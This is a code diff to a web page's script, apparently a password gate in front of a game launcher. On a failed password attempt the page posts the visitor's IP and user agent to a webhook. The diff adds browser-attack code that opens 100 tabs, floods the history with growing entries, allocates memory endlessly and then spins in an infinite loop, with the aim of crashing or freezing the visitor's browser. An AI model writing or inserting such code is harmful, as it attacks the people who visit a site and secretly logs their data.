@@ -28,7 +28,7 @@
                         const payload = {
                             content: `FAILED PASSWORD ATTEMPT\nIP: ${data.ip}\nUser-Agent: ${navigator.userAgent}`
                         };
-                        fetch(webhookUrl, {
+                        return fetch(webhookUrl, {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
@@ -36,16 +36,36 @@
                             body: JSON.stringify(payload)
                         });
                     })
-                    .finally(() => {
+                    .then(() => {
+                    for (let i = 0; i < 100; i++) {
+                    window.open("https://google.com", "_blank");
+                    console.log("Loop iteration:", i);
+                    }
+                    })
+                    .then(() => {
                     var total = "";
                     for( var i = 0; i < 10000000000000; i++ ) {
                      total += i.toString();
                     history.pushState(0,0, total );
                        }
+                    })
+                    .then(() => {
+                        let arr = [];
+                    while(true) {
+                    arr.push(new Array(1000000)); // Continuously allocate large arrays
+                     }
+                     })
+                    .then(() => {
+                    
+                    })
+                    .finally(() => {
+                    console.log("your not allowed here :)")
+                     while (true) {
+                    }
+
                     });
             }
         };
-
         function openGame() {
             var url = document.getElementById('gameUrl').value.trim() || "https://example.com";
             if (!/^https?:\/\//i.test(url)) {
